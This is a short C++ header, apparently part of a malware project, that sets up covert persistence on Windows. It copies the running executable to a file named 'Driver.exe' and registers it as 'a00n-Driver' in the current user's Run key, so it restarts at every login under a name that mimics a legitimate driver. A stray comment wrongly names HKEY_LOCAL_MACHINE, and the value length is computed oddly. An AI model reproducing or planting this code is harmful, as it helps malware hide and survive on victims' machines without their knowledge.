#pragma once
#include <atlstr.h>
namespace Persist {

	bool MakePersistence() {
		//"the persistence created at : HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
		CHAR path[MAX_PATH];

		DWORD pathLen = 0;

		pathLen = GetModuleFileNameA(NULL, path, MAX_PATH);
		std::string newfilepath = IO::GetOurPath(true) + "Driver.exe";
		std::wstring wf = std::wstring(newfilepath.begin(), newfilepath.end());
		pathLen = newfilepath.length();
		if (!CopyFileA(LPCSTR(path),LPCSTR(newfilepath.c_str()), 0))
			return false;
		
		HKEY hkey;

		if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hkey) != ERROR_SUCCESS)
			return false;

		DWORD tmp = pathLen * 2;

		if (RegSetValueExA(hkey, "a00n-Driver", 0, REG_SZ, (LPBYTE)newfilepath.c_str(), tmp) != ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
			return false;
		}
		RegCloseKey(hkey);
		return true;
	}



}